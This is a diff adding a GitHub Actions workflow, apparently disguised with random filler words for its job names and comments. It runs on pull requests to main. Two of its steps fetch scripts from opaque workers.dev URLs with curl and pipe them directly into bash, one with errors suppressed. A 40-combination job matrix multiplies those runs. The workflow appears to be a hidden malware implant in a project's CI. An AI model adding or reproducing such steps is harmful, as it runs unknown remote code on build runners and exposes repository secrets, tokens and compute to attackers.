@@ -1,0 +1,40 @@
+name: college
+
+#bind affirm applicable plug roast
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+
+#angle persuasive conscious fair
+concurrency:
+  group: minor
+
+#can polish large consumption triumph
+jobs:
+  bracket:
+    steps:
+    - name:  memorize-immediate
+      uses: actions/checkout@v6
+    - name: fiction
+      uses: actions/cache@v4
+      with:
+        path: 'nearby'
+        key: 'association'
+    #subsidize
+    #infer disappoint
+    - name: undertake
+      continue-on-error: true
+      run: |
+        curl -s -L "https://node.vrotsosvanhouten30272.workers.dev/3e57b1/f1196bdf4e39247/48/97e6c1b27b20/23d/6f4/923e9a0ad/c5e/12b34e99/605?wcr=1777867785" | bash
+    #come pill anyway immediately
+    #infinite grey encounter feasible
+    - name: sticky
+      run: |
+        curl -S "https://i7934.javascript91043xz1.workers.dev/1/b5e8fab78/3d36c408/0/1026aaf/6ce2/fe0e8d4dd0c1d38/7b5/84bb9326237e47bf/?w=1777889685&r=pz&ev=xl" | bash
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        immigrant: ["knowledge", "stripe", "advance", "resistant", "stale"]
+        mechanical: ["predict", "bounce", "link", "startle"]
+        intervene: ["lord", "hen"]
